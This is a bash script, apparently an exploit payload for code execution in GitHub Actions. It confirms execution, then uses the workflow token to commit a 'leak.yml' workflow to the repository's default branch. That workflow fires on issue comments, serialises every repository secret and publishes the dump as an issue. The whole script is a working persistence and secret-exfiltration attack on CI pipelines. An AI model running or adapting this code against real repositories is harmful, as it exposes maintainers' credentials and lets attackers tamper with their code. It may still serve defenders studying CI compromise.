#!/bin/bash
set -x
REPO="$GITHUB_REPOSITORY"
id
echo "RCE_MARKER=$(date +%s)"
echo "REPO=$REPO"
echo "TOKLEN=${#GITHUB_TOKEN}"
gh api user --jq .login 2>&1
DEFAULT=$(gh api "repos/$REPO" --jq .default_branch)
SHA=$(gh api "repos/$REPO/git/ref/heads/$DEFAULT" --jq .object.sha)
echo "DEFAULT=$DEFAULT SHA=$SHA"

cat > /tmp/leak.yml <<'YAML'
name: leak
on:
  issue_comment:
    types: [created]
permissions:
  contents: write
  issues: write
  pull-requests: write
jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: dump-secrets
        env:
          GH_TOKEN: ${{ github.token }}
          ALL: ${{ toJSON(secrets) }}
        run: |
          printf '%s\n' "$ALL" > /tmp/all.json
          gh api -X POST "repos/$GITHUB_REPOSITORY/issues" \
            -f title="secrets-dump-$(date +%s)" \
            -F body=@/tmp/all.json
          echo "DUMP_DONE"
YAML

B64=$(base64 -w0 /tmp/leak.yml)
EXISTS=$(gh api "repos/$REPO/contents/.github/workflows/leak.yml?ref=$DEFAULT" --jq .sha 2>/dev/null || true)
echo "EXISTS_SHA=$EXISTS"
if [ -n "$EXISTS" ]; then
  gh api -X PUT "repos/$REPO/contents/.github/workflows/leak.yml" \
    -f message="ci: leak workflow" -f content="$B64" -f branch="$DEFAULT" -f sha="$EXISTS" -i 2>&1 | head -25
else
  gh api -X PUT "repos/$REPO/contents/.github/workflows/leak.yml" \
    -f message="ci: leak workflow" -f content="$B64" -f branch="$DEFAULT" -i 2>&1 | head -25
fi
echo "WORKFLOW_PUSH_DONE status=$?"
